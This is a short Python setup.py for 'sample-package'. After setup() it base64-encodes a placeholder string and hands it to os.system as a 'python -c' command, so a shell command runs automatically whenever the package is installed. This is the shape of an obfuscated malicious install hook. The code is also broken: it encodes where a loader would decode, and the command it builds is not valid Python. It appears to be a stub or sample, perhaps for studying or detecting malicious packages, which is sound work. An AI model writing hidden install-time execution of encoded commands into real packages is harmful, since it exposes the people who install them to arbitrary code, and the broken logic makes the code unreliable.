from setuptools import setup
import base64
from os import system

setup(name="sample-package", version="0.1")
encoded = base64.b64encode(b"payload")
system("python -c " + repr(encoded.decode()))
